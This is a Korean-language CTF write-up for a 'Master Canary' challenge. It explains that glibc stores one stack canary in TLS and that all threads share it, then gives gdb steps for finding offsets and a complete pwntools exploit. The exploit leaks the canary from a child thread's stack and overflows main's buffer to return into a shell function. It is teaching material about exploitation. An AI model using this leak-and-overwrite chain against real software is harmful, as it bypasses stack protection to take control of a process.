# Master Canary

## 개요

이 문제는 멀티스레드(pthread) 환경에서의 **스택 카나리(stack canary)** 보호를 우회하는 문제임. 핵심은 x86-64 glibc가 카나리 값을 **TLS(Thread Local Storage)의 `fs:0x28`(= `tcbhead_t.stack_guard`)에 저장**하고, 메인 스레드든 `pthread_create`로 생성된 자식 스레드든 **동일한 하나의 카나리 값(이른바 master canary)** 을 공유한다는 점임.

문제 바이너리는 두 가지 버그를 제공함:

1. **자식 스레드 스택 버퍼(`buf[256]`)에 대한 크기 무제한 읽기 + 출력** → 스레드 스택 위쪽에 있는 **TLS의 카나리 값을 그대로 leak** 할 수 있음.
2. **메인 스레드 스택 버퍼(`leave_comment[32]`)에 대한 1024바이트 오버플로우** → 반환 주소를 덮을 수 있지만 메인 함수에는 카나리가 걸려 있음.

메인 스레드의 카나리와 자식 스레드의 카나리가 **같은 값**이므로, (1)에서 자식 스레드의 TLS 카나리를 leak 한 뒤 (2)에서 그 값을 그대로 카나리 자리에 채워 넣으면 `__stack_chk_fail` 없이 메인의 반환 주소를 `get_shell`로 바꿀 수 있음. 이것이 "master canary" 기법의 전부임.

## 바이너리 분석

```c
// gcc -o master master.c -pthread
char *global_buffer;

void get_shell() {
    system("/bin/sh");
}

void *thread_routine() {
    char buf[256];
    global_buffer = buf;        // 자식 스레드 스택의 buf 주소를 전역에 저장
}

void read_bytes(char *buf, size_t size) {
    // size 만큼 1바이트씩 read, 크기 검사 전혀 없음
    while (sz < size) { read(0, &buf[idx], 1); idx++; sz++; }
}

int main(int argc, char *argv[]) {
    char leave_comment[32];
    // ...
    case 1: pthread_create(&thread_t, NULL, thread_routine, NULL);   // 스레드 생성
    case 2:
        scanf("%lu", &size);
        read_bytes(global_buffer, size);          // global_buffer(=자식 스택 buf)에 size 바이트
        printf("Data: %s", global_buffer);        // 그대로 출력 → leak
    case 3:
        read(0, leave_comment, 1024);             // 32바이트 버퍼에 1024바이트 → BOF
        return 0;
}
```

보호 기법 (checksec):

| 항목 | 값 | 의미 |
|---|---|---|
| Arch | amd64-64-little | x86-64 |
| RELRO | Partial RELRO | GOT 일부 쓰기 가능하나 여기선 미사용 |
| Stack | Canary found | 스택 카나리 존재 (우회 대상) |
| NX | NX enabled | 스택 실행 불가 → ret2code 필요 |
| PIE | No PIE (0x400000) | **주소 고정** → `get_shell=0x400a4a` 그대로 사용 |
| Stripped | No | 심볼 존재 (`elf.symbols['get_shell']`) |

배포 환경은 Dockerfile 상 **Ubuntu 16.04 → glibc 2.23**. 이 버전의 스레드 TLS 레이아웃에서 자식 스레드의 `buf`와 카나리 사이 거리가 `poc.py`의 `0x8e8`로 나옴.

디스어셈블로 확인한 핵심 오프셋:

- `thread_routine` : `lea rax,[rbp-0x110]` 를 `global_buffer`에 저장 → `buf`는 `rbp-0x110`. (소스엔 256바이트지만 스택 정렬로 0x110 프레임.)
- `main` : `read(0, [rbp-0x30], 1024)` → `leave_comment`는 `rbp-0x30`. 카나리는 `[rbp-0x8]`. 따라서 **`leave_comment` ~ 카나리 거리 = 0x30 - 0x8 = 0x28**.
- `get_shell` : `0x400a4a` (No PIE).

## 핵심 기법: 왜 "master canary" 인가

x86-64 glibc에서 스택 카나리는 전역이나 스택이 아니라 **TLS의 `tcbhead_t.stack_guard` 필드(`fs:0x28`)** 에 저장됨. 프롤로그에서 `mov rax, QWORD PTR fs:0x28` 로 가져와 `[rbp-0x8]`에 깔고, 에필로그에서 다시 `fs:0x28`과 XOR 해서 검증함 (위 디스어셈블의 `400a66`, `400b14` 참고).

- **메인 스레드**: TLS는 ld.so가 초기화. 커널/`_dl_random`에서 받은 랜덤으로 `stack_guard`를 한 번 세팅함. 이 값이 이른바 **master canary**.
- **자식 스레드**: `pthread_create` → `allocate_stack`이 스레드 전용 스택과 TLS 블록을 mmap으로 잡고, 새 TCB를 초기화할 때 **메인(master) 카나리 값을 그대로 복사**해옴 (`THREAD_COPY_STACK_GUARD`). 즉 **모든 스레드의 카나리는 동일**함.

여기서 중요한 레이아웃 특성:

- 자식 스레드의 스택과 그 TCB(TLS, 카나리 포함)는 **같은 mmap 영역에 인접**해서 배치됨. 스택은 아래로 자라고 TCB는 그 위쪽(높은 주소)에 위치하므로, 자식 스택의 `buf`에서 **위 방향으로 쭉 읽어 올라가면 TCB의 `stack_guard`에 도달**할 수 있음.
- 반면 메인 스레드의 TLS는 보통 스택과 멀리 떨어져 있어 메인 버퍼 오버플로우만으로는 카나리를 직접 읽기 어려움.

따라서 "카나리를 직접 읽을 수 있는 쪽(자식 스레드)"에서 leak 하고, "반환 주소를 덮고 싶은 쪽(메인)"에 그 값을 재사용하는 것이 전략임. 두 값이 같기 때문에 성립함.

leak 트릭 하나 더: 카나리의 **최하위 1바이트는 항상 `0x00`**(null byte terminator, 문자열 leak 방어용). `printf("%s")`는 null에서 멈추므로, `buf`부터 카나리 바로 앞까지를 non-null로 채우고 **카나리의 null 바이트 1개까지 덮어쓰면** `%s`가 그 null을 건너뛰고 카나리 상위 7바이트를 이어서 출력함. 그래서 `0x8e8`(= buf~canary 거리)에 **+1** 을 해서 null 1바이트를 덮고, leak 결과 앞에 `\x00`을 다시 붙여 원래 카나리를 복원함.

## GDB로 오프셋/주소 구하기

`poc.py`에 하드코딩된 값은 세 개뿐임. 각각을 gdb/pwndbg로 구하는 방법:

### (1) `get_shell = 0x400a4a` — No PIE 고정 주소

No PIE라 로드 주소가 `0x400000`으로 고정. 심볼이 남아 있으므로 그대로 조회 가능.

```
pwndbg> p get_shell
$1 = {<text variable, no debug info>} 0x400a4a <get_shell>
pwndbg> info address get_shell
Symbol "get_shell" is static storage at address 0x400a4a.
```

`poc.py`에서는 `elf.symbols['get_shell']`로 pwntools가 ELF 심볼 테이블에서 직접 읽음(= `0x400a4a`).

### (2) `0x28` — 메인 `leave_comment` ~ 카나리 거리

메인의 `read(leave_comment, 1024)` 직전에 브레이크하고 버퍼와 카나리 자리를 비교:

```
pwndbg> b *0x400c55            # main 의 read@plt 호출 지점 (leave_comment 로 read)
pwndbg> r
pwndbg> p/x $rbp
# read 의 버퍼 인자는 lea [rbp-0x30] → leave_comment = rbp-0x30
# 카나리는 [rbp-0x8] 에 저장되어 있음 (프롤로그 mov [rbp-0x8], fs:0x28)
pwndbg> p/x (0x30 - 0x8)
$ = 0x28
```

즉 `leave_comment`부터 저장된 카나리까지 `0x28`바이트. 디스어셈블(`lea rax,[rbp-0x30]`가 read 버퍼, `mov [rbp-0x8],rax`가 카나리)로도 동일하게 확인됨. 그 뒤 구조는 `카나리(8) → saved rbp(8) → return address(8)`.

### (3) `canary_offset = 0x8e8` — 자식 스택 `buf` ~ TLS 카나리 거리

이게 이 문제의 핵심 오프셋임. 자식 스레드를 하나 만든 뒤, 그 스레드의 `buf` 주소와 그 스레드 TLS의 카나리 주소를 각각 구해서 빼면 됨.

먼저 `buf` 주소. `thread_routine`은 `global_buffer = buf` 를 해주므로 전역만 읽으면 됨:

```
pwndbg> b thread_routine
pwndbg> r
> 1                            # Create thread → 자식 스레드 진입, 브레이크
pwndbg> p/x global_buffer      # buf = rbp-0x110 의 실제 주소
$ = 0x7ffff6ff e6f0           # (예시)
```

다음으로 이 **자식 스레드**의 카나리 주소. 카나리는 그 스레드 TCB의 `fs:0x28`에 있음. 스레드별 FS base를 확인:

```
pwndbg> info threads           # 자식 스레드 번호 확인
pwndbg> thread 2               # 자식 스레드로 전환
pwndbg> p/x $fs_base           # 이 스레드의 TLS(TCB) base
$ = 0x7ffff6fff700            # (예시)
# 카나리 저장 위치 = fs_base + 0x28
pwndbg> x/gx $fs_base + 0x28
0x7ffff6fff728: 0x<랜덤>00     # 최하위 바이트 0x00 확인
```

또는 pwndbg 내장 명령으로 바로 찾을 수 있음:

```
pwndbg> tls                    # TLS(tcbhead_t) 덤프, stack_guard 위치 표시
pwndbg> canary                 # 현재 카나리 값과 저장 주소를 출력
pwndbg> search -8 <카나리값>    # 카나리가 스택/TLS 어디에 있는지 전부 검색
```

마지막으로 거리를 계산:

```
pwndbg> p/x (($fs_base + 0x28) - (unsigned long)global_buffer)
$ = 0x8e8
```

즉 `buf`에서 `0x8e8`바이트 위가 자식 스레드 TLS의 카나리. (이 값은 glibc 버전·스택 크기에 따라 달라지므로 배포 환경인 glibc 2.23 기준으로 구해야 함. 로컬에서 다른 libc로 뽑으면 값이 어긋날 수 있음.) 메인 카나리와 자식 카나리가 같은지도 `thread 1`(메인)의 `fs_base+0x28` 값과 비교해 확인하면 master canary 공유를 눈으로 검증할 수 있음.

## 익스플로잇 (poc.py)

```python
elf = ELF("./master_canary", checksec=False)
canary_offset = 0x8e8

# 1. 스레드 생성
p.sendlineafter(b"> ", b"1")
```

메뉴 1번으로 `pthread_create` 호출 → 자식 스레드가 `thread_routine`을 실행하며 `global_buffer = buf`(자식 스택 버퍼) 세팅. 이제 메뉴 2번의 입력은 **자식 스레드 스택**을 건드림.

```python
# 2. 마스터 카나리 유출
p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"Size: ", str(canary_offset + 1).encode())

leak_payload = b"A" * (canary_offset + 1)
p.sendafter(b"Data: ", leak_payload)

p.recvuntil(leak_payload)
canary = u64(b"\x00" + p.recvn(7))
```

- `read_bytes`에 크기 검사가 없으므로 `0x8e8 + 1`바이트를 `global_buffer`에 쏟아부음 → `buf`부터 카나리 **바로 앞 `0x8e8`바이트 + 카나리 최하위 null 1바이트**까지 `'A'`로 덮임.
- 이어지는 `printf("Data: %s", global_buffer)`가 `'A'` 들을 출력하다가 null이 아닌 카나리 상위 7바이트를 그대로 뒤에 붙여 출력함.
- `recvuntil(leak_payload)`로 보낸 `'A'`들을 소비하고, `recvn(7)`로 카나리 상위 7바이트를 받음. 최하위 null은 우리가 덮어썼으니 `b"\x00"`을 앞에 붙여 `u64`로 복원 → **master canary 획득**.

```python
# 3. 메인 스레드의 반환 주소 조작
p.sendlineafter(b"> ", b"3")

payload  = b"A" * 0x28
payload += p64(canary)
payload += b"B" * 8
payload += p64(elf.symbols["get_shell"])

p.sendafter(b"Leave comment: ", payload)
p.interactive()
```

- 메뉴 3번은 `read(0, leave_comment, 1024)` → 32바이트 버퍼에 1024바이트까지 → **메인 스택 오버플로우**.
- 페이로드 구성:
  - `'A' * 0x28` : `leave_comment`부터 저장된 카나리 직전까지 채움 ((2)에서 구한 0x28).
  - `p64(canary)` : leak 한 master canary를 **카나리 자리에 그대로** 넣음 → 에필로그의 `xor fs:0x28` 검증 통과 (자식·메인 카나리 동일하므로).
  - `b"B" * 8` : saved `rbp` (더미).
  - `p64(get_shell)` : 반환 주소를 `0x400a4a`로 덮음.
- `main`이 `return 0` 하면 카나리 검사를 무사히 통과하고 `get_shell`로 리턴 → `system("/bin/sh")` 실행. `p.interactive()`로 셸 획득.

### 단계별 상태

| 단계 | 메뉴 | 동작 | 결과 |
|---|---|---|---|
| 1 | 1 | `pthread_create` | 자식 스레드 생성, `global_buffer`=자식 `buf` |
| 2 | 2 | `0x8e8+1` 바이트 쓰고 `%s` 출력 | 카나리 null 덮고 상위 7바이트 leak → **master canary** |
| 3 | 3 | `leave_comment`에 BOF | `A*0x28 + canary + rbp + get_shell` |
| 4 | — | `main` return | 카나리 검사 통과 → `get_shell` → 셸 |

## 핵심 요약

| 요소 | 내용 |
|---|---|
| 취약점 | (1) 자식 스레드 `buf`에 크기 무제한 입력+출력 → 카나리 leak, (2) 메인 `leave_comment[32]`에 1024바이트 BOF |
| 보호 기법 | Canary, NX, Partial RELRO, **No PIE**(주소 고정) |
| 핵심 개념 | 카나리는 TLS `fs:0x28`에 저장, **모든 스레드가 master canary 공유** |
| leak 원리 | 자식 스택~TLS 인접 → `buf`에서 `0x8e8` 위가 카나리, null 1바이트 덮고 `%s`로 상위 7바이트 유출 |
| 재사용 | 자식에서 leak 한 카나리를 메인 카나리 자리에 그대로 삽입 → `__stack_chk_fail` 우회 |
| 하드코딩 값 | `canary_offset=0x8e8`(buf~TLS 카나리, glibc 2.23 기준), `0x28`(leave_comment~카나리), `get_shell=0x400a4a` |
| 최종 목표 | 메인 반환 주소를 `get_shell`로 → `system("/bin/sh")` |

이 문제의 교훈은 스택 카나리가 스레드별로 독립된 비밀이 아니라 **프로세스 전체가 하나의 master canary를 TLS에 공유**한다는 점임. 따라서 어느 한 스레드에서든 TLS의 카나리를 읽어낼 수 있는 leak 경로가 있으면, 그 값으로 다른 스레드(특히 메인)의 카나리 검사까지 한 번에 뚫을 수 있음. 자식 스레드의 스택과 TLS가 인접 배치된다는 레이아웃 특성이 이 leak을 가능하게 하는 전제 조건임.
